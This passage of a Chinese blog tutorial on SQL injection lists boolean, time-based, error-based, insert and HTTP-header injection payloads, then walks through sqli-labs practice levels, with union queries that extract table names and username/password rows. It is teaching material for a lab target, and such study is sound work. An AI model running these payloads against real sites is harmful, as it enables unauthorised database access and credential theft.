3. 获取表的列名</span></span><br><span class="line"><span class="string">-- 3.1 获取第一个列名</span></span><br><span class="line"><span class="string">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3.2 获取第一个列名的第一个字符</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COULMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 获取表的内容</span></span><br><span class="line">x<span class="string">&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>基于时间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; and sleep(5)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line"><span class="comment">-- 1.1 获取数据库名的长度</span></span><br><span class="line">x&#x27; and if((length(database())=2),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1.2 获取数据名的第一个字符</span></span><br><span class="line">x&#x27; and if((substr(database(),1,1)=&#x27;p&#x27;),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名</span></span><br><span class="line"><span class="comment">-- 2.1 获取第一个表</span></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.2 获取第一个表的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and if(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>h<span class="string">&#x27;,sleep(5),null)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3. 获取表的列名</span></span><br><span class="line"><span class="string">-- 3.1 获取第一个列名</span></span><br><span class="line"><span class="string">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3.2 获取第一个列名的第一个字符</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">null</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 获取表的内容</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4.1 查询第一个用户名的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(5),null)#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><ul>
+<li>获取基本信息</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;</span><br><span class="line">x&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">x&#x27; or updatexml(1,concat(0x7e,user()),0) or&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取当前数据库的所有表名(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取表的列名(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取表的内容(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><ul>
+<li>注入点</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">User-Agent：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">Accept：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h1><ul>
+<li>接下来就用实战的方式来巩固这些内容，当然，不是真的去攻击网站，只是用靶机尝试</li>
+<li>这里我用到的靶机是 <code>sqli-labs</code>，非常适合新手练习</li>
+<li>我会带着大家做一部分关卡进行练习</li>
+</ul>
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><img data-src="/images/sql/2.png"></p>
+<ul>
+<li><p>发现第一关是基于单引号的字符型注入</p>
+</li>
+<li><p>这里我们一步一步来，先构造一条最简单的语句 <code>?id=1</code></p>
+<p><img data-src="/images/sql/1.png"></p>
+</li>
+<li><p>可以看到有内容显示，显示了 name 和 password</p>
+</li>
+<li><p>因为是基于单引号的报错，可以输入 <code>?id=1&#39;</code> </p>
+<p><img data-src="/images/sql/3.png"></p>
+</li>
+<li><p>从报错信息可以看出，单引号也被带入了查询，<code>1&#39;&#39; LIMIT 0,1&#39;</code> ，这里可以看出是闭合的问题，<code>1&#39;</code>后边的数据可以都丢掉，之前说过，最好不要用 # 注释，因为 # 这种特殊符号都被转义了，建议使用 %23</p>
+<p><img data-src="/images/sql/4.png"></p>
+<p><img data-src="/images/sql/5.png"></p>
+</li>
+<li><p>没有报错，说明闭合成功，接下来就可以构造查询语句，获取数据库的信息</p>
+</li>
+<li><p>使用 union 查询，获取当前查询的列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;  union <span class="keyword">select</span> <span class="number">1</span> %<span class="number">23</span></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,2 %23</span></span><br><span class="line"><span class="string">payload：?id=1&#x27;</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/6.png"></p>
+<p><img data-src="/images/sql/7.png"></p>
+<p><img data-src="/images/sql/8.png"></p>
+</li>
+<li><p>发现查询到第三条没有报错，可以确认列数就是3</p>
+</li>
+<li><p>为了能够将后边构造的的数据显示在界面上，需要将前边的数据屏蔽掉，让构造的<code>id=-1</code></p>
+<p><img data-src="/images/sql/9.png"></p>
+</li>
+<li><p>可以看到2和3都显示了出来，将它们换成其他的函数，获取信息</p>
+</li>
+<li><p>获取数据库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/10.png"></p>
+</li>
+<li><p>获取表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,TABLE_NAME,<span class="number">2</span> <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;security&#x27;</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/11.png"></p>
+</li>
+<li><p>获取列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,COLUMN_NAME,<span class="number">2</span> <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> TABLE_SCHEMA=<span class="string">&#x27;security&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> %<span class="number">23</span></span><br><span class="line"></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union select 1,COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; and TABLE_SCHEMA=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; limit 2,1 %23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/12.png"></p>
+<p><img data-src="/images/sql/13.png"></p>
+</li>
+<li><p>获取表信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">security</span>,<span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取第二条数据，以此类推</span></span><br><span class="line"></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union select 1,username,password from security,users limit 1,1 %23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/14.png"></p>
+<p><img data-src="/images/sql/15.png"></p>
+</li>
+</ul>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><ul>
+<li><p>第二关是基于错误数字型注入</p>
+</li>
+<li><p>首先构造payload：<code>?id=1&#39;</code></p>
+<p><img data-src="/images/sql/16.png"></p>
+</li>
+<li><p>构造闭合：<code>1 or 1=1 %23</code>，测试</p>
+<p><img data-src="/images/sql/17.png"></p>
+</li>
+<li><p>没有报错，说明可以注入</p>
+</li>
+<li><p>获取当前查询的列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/18.png"></p>
+</li>
+<li><p>获取数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/19.png"></p>
+</li>
+<li><p>接下来的操作和前边一样了</p>
+</li>
+</ul>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><ul>
+<li><p>构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;</span><br><span class="line">payload：?id=1&#x27;))</span><br><span class="line">payload：?id=1&quot;</span><br><span class="line">payload：?id=1&quot;))</span><br><span class="line">payload：?id=1&#x27;)</span><br><span class="line">payload：?id=1&quot;)</span><br><span class="line"><span class="comment">-- 在前边的关卡，报错方式比较简单，这6种可以都尝试一下</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/20.png"></p>
+</li>
+<li><p>获取数据集名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：-1&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/21.png"></p>
+</li>
+</ul>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><ul>
+<li><p>这一关使用双注入来完成（感兴趣的小伙伴请自行查阅）</p>
+</li>
+<li><p>构造闭合语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：id=1&#x27; and 0 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/22.png"></p>
+</li>
+<li><p>获取数据库的名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 0 union <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">database</span>(), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">count</span>：聚合函数</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：分组语句</span><br><span class="line"><span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)：取整</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/23.png"></p>
+</li>
+</ul>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><ul>
+<li><p>这一关使用基于布尔的盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 %23</span><br><span class="line">1&#x27; and 1=2 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/24.png"></p>
+<p><img data-src="/images/sql/25.png"></p>
+</li>
+<li><p>可以看到，and后面的表达式为真就输出内容，为假不输出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=判断的长度 %23</span><br><span class="line">1&#x27; and substr(database(),第n个字母,1)=数值 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/26.png"></p>
+</li>
+</ul>
+<p><img data-src="/images/sql/27.png"></p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><ul>
+<li><p>这一关是post注入</p>
+</li>
+<li><p>构造语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; union <span class="keyword">select</span> <span class="keyword">version</span>(), <span class="keyword">database</span>() %<span class="number">23</span> %<span class="number">23</span>&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/28.png"></p>
+</li>
+</ul>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><ul>
+<li><p>这一关是cookie的操作</p>
+</li>
+<li><p>先构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhubokai&#x27; and updatexml(1,concat(0x7e, version()),1) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/29.png"></p>
+</li>
+</ul>
+<ul>
+<li>就带想入门的小伙伴写到这里，剩下的感兴趣的可以自己再写</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+	
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Demons
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.zhubokai.com/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html" title="SQL注入入门教程">https://www.zhubokai.com/SQL入门教程.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+          </div>
+
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
+    </div>
+  </div>
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" rel="prev" title="python正则表达式入门">
+      <i class="fa fa-chevron-left"></i> python正则表达式入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E5%AF%BB%E6%89%BEmain%E5%87%BD%E6%95%B0.html" rel="next" title="寻找main函数">
+      寻找main函数 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-text">SQL注入攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9-%E5%90%8E%E7%AB%AF%E6%98%AF%E5%90%A6%E4%B8%A5%E6%A0%BC%E6%A0%A1%E9%AA%8C"><span class="nav-text">判断是否存在注入点(后端是否严格校验)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87SQL%E6%8C%87%E4%BB%A4%E8%8E%B7%E5%8F%96%E5%88%B0%E6%83%B3%E8%A6%81%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-text">通过SQL指令获取到想要的数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="nav-text">获取权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">SQL注入-常见注入类型以及注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%97%B6%E6%B3%A8%E6%84%8F%E7%9A%84MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E9%87%8A"><span class="nav-text">SQL注入时注意的MySql数据库注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F-get-amp-post-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">注入方式 get&amp;post 的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="nav-text">基于函数报错信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="nav-text">insert注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-text">http头注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0"><span class="nav-text">实战练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1"><span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-2"><span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-3"><span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-5"><span class="nav-text">less-5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-8"><span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-11"><span class="nav-text">less-11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-20"><span class="nav-text">less-20</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Demons" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Demons</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Demons-t" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Demons-t" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:kai.huan.demons@gmail.com" title="E-Mail → mailto:kai.huan.demons@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.notion.so/App-2f4b23277b5748fba56f1a9d9d10ce52" title="notion → https:&#x2F;&#x2F;www.notion.so&#x2F;App-2f4b23277b5748fba56f1a9d9d10ce52" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-cat fa-fw"></i></a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://hugang-first.github.io/" title="http:&#x2F;&#x2F;hugang-first.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">胡港</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
